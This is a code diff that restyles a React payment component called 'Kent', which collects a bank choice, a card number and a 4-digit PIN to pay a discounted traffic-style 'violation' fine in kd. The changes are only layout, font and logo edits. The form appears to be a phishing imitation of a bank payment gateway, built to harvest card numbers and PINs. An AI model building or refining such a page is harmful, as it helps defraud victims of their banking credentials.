@@ -428,12 +428,12 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
           <div id="FCUseDebitEnable" style={{ marginTop: 5 }}>
             {/* Bank Selection */}
             <div className="row">
-              <label className="column-label" style={{ width: "40%" }}>
+              <label className="column-label" style={{ width: "32%" }}>
                 Select Your Bank:
               </label>
               <select
                 className="column-value"
-                style={{ width: "60%" }}
+                style={{ width: "67%" }}
                 onChange={(e) => handleBankSelection(e.target.value)}
                 value={paymentInfo.bank}
               >
@@ -474,7 +474,7 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
                 pattern="[0-9]*"
                 size={10}
                 className="allownumericwithoutdecimal"
-                style={{ width: "45%", marginLeft: 2 }}
+                style={{ width: "35%", marginLeft: 2 }}
                 maxLength={10}
                 onChange={(e) => handlePaymentInfoChange("cardNumber", e.target.value)}
                 value={paymentInfo.cardNumber}
@@ -518,10 +518,11 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
             </div>
 
             {/* PIN */}
-            <div className="row" id="PinRow">
-              <div className="row">
+            <div className="row" id="PinRow" >
+              <div className="row" style={{flex:'left',justifyContent:'center'}}>
                 <label className="col">PIN:</label>
                 <input
+
                   inputMode="numeric"
                   pattern="[0-9]*"
                   name="cardPin"
@@ -532,7 +533,7 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
                   title="Should be in number. Length should be 4"
                   type="password"
                   size={4}
-                  style={{ width: "80%" }}
+                  style={{ width: "70%",marginLeft:'auto' }}
                   maxLength={4}
                   className="allownumericwithoutdecimal col-9"
                 />
@@ -856,7 +857,7 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
               {/* Payment Information Card */}
               <div className="form-card" style={{ display: step >= 2 ? "none" : "block" }}>
                 <div className="" style={{ display: "flex", justifyContent: "center" }}>
-                  <img src="./kv.png" className="-" alt="logo" width={50} />
+                  <img src="./download.jpeg" className="-" alt="logo" width={90} />
                 </div>
                 <div className="row">
                   <label className="column-label">Merchant: </label>
@@ -865,13 +866,13 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
                 <div id="OrgTranxAmt">
                   <div className="row">
                     <label className="column-label">Amount: </label>
-                    <label className="column-value" style={{ width: "50%" }}>
-                      <s>
+                    <label className="column-value text-label col" style={{ width: "50%" }}>
+                      <s style={{fontSize:9}}>
                         {props.violationValue === 0
                           ? "5.00 kd"
                           : `${Number.parseFloat(props.violationValue!.toString()).toFixed(2)} kd`}
                       </s>
-                      <span className="m-1">{discountedAmount.toFixed(2)} kd</span>
+                      <span style={{fontSize:9}} className="m-1">{discountedAmount.toFixed(2)} kd</span>
                     </label>
                   </div>
                 </div>
@@ -1149,7 +1150,9 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
     }
     .form-card {
         background-color: #ffffff;
-        padding: 20px;
+        padding: 15px;
+
+        margin:15px;
         border: 2px solid #8f8f90;
         border-radius: 15px;
         margin-bottom: 15px;
@@ -1167,25 +1170,27 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
         padding-bottom: 0;
     }
     form label {
-        font-size: 11px;
-        color: #0070cd;
+      font-size:10px !important;
+      color: #0070cd;
         font-weight: bold;
         text-shadow: 0 1px 2px rgba(0,0,0,0.2);
     }
     select {
         font-size:11px;
         height:20px;
+        border:1px black solid;
     }
     form .text-label, input, select {
         color: #444444;
         font-weight: normal;
+        font-size:8px !important;
     }
     form input[type=tel],input[type=password]{
         border: 2px solid #0070cd;
         box-shadow: inset 0 0 5px rgba(0,0,0,0.3);
         padding: 0 3px;
         outline: 0;
-      font-size:11px;
+        font-size:8px !important;
       height:20px;
     }
     form input[type=text],input[type=password]{
